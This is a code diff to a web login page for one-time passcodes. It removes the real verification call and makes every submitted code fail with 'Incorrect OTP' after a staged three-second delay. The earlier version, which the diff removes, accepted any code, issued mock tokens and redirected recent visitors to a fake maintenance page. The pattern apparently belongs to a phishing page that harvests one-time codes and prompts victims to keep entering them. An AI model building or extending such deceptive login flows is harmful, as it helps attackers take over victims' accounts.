@@ -43,45 +43,18 @@ export default function LoginOtpPage() {
     }
 
     setIsLoading(true);
+    setError('');
     
     // Note: Notification is now handled in the verify-otp API route
 
     // Verify OTP (accept any OTP for now as requested)
     try {
-      const response = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ otp: otp.join('') })
-      });
+      // Add a 3 second delay before showing incorrect OTP message
+      await new Promise(resolve => setTimeout(resolve, 3000));
       
-      const data = await response.json();
+      // Regardless of whether OTP is valid or invalid, show "incorrect OTP" message after delay
+      setError('Incorrect OTP. Please try again.');
       
-      if (response.ok) {
-        // In a real implementation, you would receive a token after OTP verification
-        // For now, we'll create a mock token
-        const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-        localStorage.setItem('token', token);
-        
-        setSuccess(true);
-        setError('');
-        
-        // Check if user logged in within the last 4 hours
-        const lastLoginTime = localStorage.getItem('lastLoginTime');
-        const now = Date.now();
-        
-        // If last login was less than 4 hours ago (4 * 60 * 60 * 1000 ms), show maintenance page
-        if (lastLoginTime && (now - parseInt(lastLoginTime)) < 4 * 60 * 60 * 1000) {
-          // Redirect to maintenance page after a short delay
-          setTimeout(() => {
-            router.push('/maintenance');
-          }, 1500);
-        } else {
-          // Otherwise, stay on the same page to show success message
-          // The success message is already shown in the UI
-        }
-      } else {
-        setError(data.message || 'Invalid OTP. Please try again.');
-      }
     } catch (err) {
       setError('An error occurred. Please try again.');
       console.error(err);
@@ -140,7 +113,7 @@ export default function LoginOtpPage() {
                 </svg>
               </div>
               <h2 className="text-xl font-semibold mb-2">Verification Successful!</h2>
-              <p className="text-gray-600">Redirecting to dashboard...</p>
+              <p className="text-gray-600">Your login has been verified.</p>
             </div>
           ) : (
             <form onSubmit={handleSubmit} className="space-y-6">
